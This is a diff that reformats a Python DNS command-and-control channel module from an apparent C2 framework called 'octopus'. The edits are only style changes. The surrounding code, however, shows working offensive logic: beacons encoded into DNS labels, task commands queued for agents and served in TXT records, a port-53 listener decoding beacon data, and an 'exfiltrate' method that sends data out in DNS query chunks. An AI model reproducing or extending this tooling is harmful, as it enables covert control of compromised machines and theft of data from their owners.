@@ -27,9 +27,9 @@ from typing import Optional
 logger = logging.getLogger("octopus.c2.channels.dns")
 
 # DNS constants
-_MAX_LABEL_LEN = 63       # RFC 1035: max label length
-_MAX_NAME_LEN = 253       # RFC 1035: max total domain name length
-_DNS_HEADER_LEN = 12      # Standard DNS header size
+_MAX_LABEL_LEN = 63  # RFC 1035: max label length
+_MAX_NAME_LEN = 253  # RFC 1035: max total domain name length
+_DNS_HEADER_LEN = 12  # Standard DNS header size
 _DNS_TYPE_A = 1
 _DNS_TYPE_TXT = 16
 _DNS_CLASS_IN = 1
@@ -116,8 +116,7 @@ class DNSChannel:
         self._listener_thread: Optional[threading.Thread] = None
         self._lock: threading.Lock = threading.Lock()
 
-        logger.info("DNS C2 channel initialized: domain=%s, record_type=%s",
-                     self.domain, self.record_type)
+        logger.info("DNS C2 channel initialized: domain=%s, record_type=%s", self.domain, self.record_type)
 
     def encode_data(self, data: bytes) -> list[str]:
         """Split data into DNS-safe labels (≤63 chars each).
@@ -140,7 +139,7 @@ class DNSChannel:
         encoded = _b32_encode_safe(data)
         labels: list[str] = []
         for i in range(0, len(encoded), _MAX_LABEL_LEN):
-            labels.append(encoded[i:i + _MAX_LABEL_LEN])
+            labels.append(encoded[i : i + _MAX_LABEL_LEN])
         return labels
 
     def decode_data(self, labels: list[str]) -> bytes:
@@ -192,15 +191,11 @@ class DNSChannel:
 
         # Validate total length
         if len(query_name) > _MAX_NAME_LEN:
-            logger.warning(
-                "Beacon query too long (%d chars), truncating data",
-                len(query_name)
-            )
+            logger.warning("Beacon query too long (%d chars), truncating data", len(query_name))
             # Truncate data labels to fit
             max_data_len = _MAX_NAME_LEN - len(safe_agent) - len(self.domain) - 2
             encoded = _b32_encode_safe(data)[:max_data_len]
-            labels = [encoded[i:i + _MAX_LABEL_LEN]
-                      for i in range(0, len(encoded), _MAX_LABEL_LEN)]
+            labels = [encoded[i : i + _MAX_LABEL_LEN] for i in range(0, len(encoded), _MAX_LABEL_LEN)]
             parts = [*labels, safe_agent, self.domain]
             query_name = ".".join(parts)
 
@@ -235,8 +230,7 @@ class DNSChannel:
             tasks = self._pending_tasks.get(agent_id, [])
             if tasks:
                 task = tasks.pop(0)
-                logger.info("Task dispatched to agent %s: %s",
-                            agent_id, task.get("task_id", "unknown"))
+                logger.info("Task dispatched to agent %s: %s", agent_id, task.get("task_id", "unknown"))
                 return task
 
         # Client-side: query DNS for tasks
@@ -247,6 +241,7 @@ class DNSChannel:
             txt_records = _dns_query_txt(query_name)
             if txt_records:
                 import json
+
                 raw = "".join(txt_records)
                 decoded = _b32_decode_safe(raw)
                 task = json.loads(decoded)
@@ -268,10 +263,12 @@ class DNSChannel:
         with self._lock:
             if agent_id not in self._pending_tasks:
                 self._pending_tasks[agent_id] = []
-            self._pending_tasks[agent_id].append({
-                "task_id": task_id,
-                "command": command,
-            })
+            self._pending_tasks[agent_id].append(
+                {
+                    "task_id": task_id,
+                    "command": command,
+                }
+            )
         logger.info("Task %s queued for agent %s", task_id, agent_id)
 
     def exfiltrate(self, data: bytes, chunk_size: int = 180) -> int:
@@ -332,8 +329,7 @@ class DNSChannel:
         except Exception as _exc:
             logging.debug(f"Suppressed in dns.py: {_exc}")
 
-        logger.info("Exfiltration complete: %d chunks, %d bytes, hash=%s",
-                     queries_sent, len(data), data_hash)
+        logger.info("Exfiltration complete: %d chunks, %d bytes, hash=%s", queries_sent, len(data), data_hash)
         return queries_sent
 
     def start_listener(self, port: int = 53) -> None:
@@ -431,7 +427,7 @@ class DNSChannel:
                     continue
 
                 # Strip our domain suffix to get the data portion
-                prefix = query_name[:-(len(self.domain) + 1)]
+                prefix = query_name[: -(len(self.domain) + 1)]
                 labels = prefix.split(".")
 
                 response = self._handle_query(labels, query_name, qtype, data, addr)
@@ -503,6 +499,7 @@ class DNSChannel:
 
             if task is not None:
                 import json
+
                 task_bytes = json.dumps(task).encode("utf-8")
                 task_encoded = _b32_encode_safe(task_bytes)
                 return _build_dns_txt_response(raw_query, query_name, task_encoded)
@@ -515,8 +512,7 @@ class DNSChannel:
             data_labels = labels[:-1]
             try:
                 beacon_data = self.decode_data(data_labels)
-                logger.info("Beacon received from agent %s at %s: %d bytes",
-                            agent_id, addr[0], len(beacon_data))
+                logger.info("Beacon received from agent %s at %s: %d bytes", agent_id, addr[0], len(beacon_data))
             except Exception as exc:
                 logger.debug("Failed to decode beacon data: %s", exc)
 
@@ -541,10 +537,13 @@ def _dns_query_txt(name: str) -> list[str]:
         socket.gaierror: If DNS resolution fails.
     """
     import subprocess
+
     try:
         result = subprocess.run(
             ["dig", "+short", "TXT", name],
-            capture_output=True, text=True, timeout=10,
+            capture_output=True,
+            text=True,
+            timeout=10,
         )
         records = []
         for line in result.stdout.strip().split("\n"):
@@ -606,14 +605,14 @@ def _parse_dns_query(data: bytes) -> tuple[str, int]:
         if offset + length > len(data):
             raise ValueError("DNS label exceeds packet length")
 
-        label = data[offset:offset + length].decode("ascii", errors="replace")
+        label = data[offset : offset + length].decode("ascii", errors="replace")
         labels.append(label)
         offset += length
 
     if offset + 4 > len(data):
         raise ValueError("DNS packet missing QTYPE/QCLASS")
 
-    qtype = struct.unpack("!H", data[offset:offset + 2])[0]
+    qtype = struct.unpack("!H", data[offset : offset + 2])[0]
     query_name = ".".join(labels)
 
     return query_name, qtype
@@ -695,7 +694,7 @@ def _build_dns_txt_response(
     txt_bytes = txt_data.encode("ascii")
     rdata = b""
     for i in range(0, len(txt_bytes), 255):
-        chunk = txt_bytes[i:i + 255]
+        chunk = txt_bytes[i : i + 255]
         rdata += struct.pack("!B", len(chunk)) + chunk
 
     # Answer section
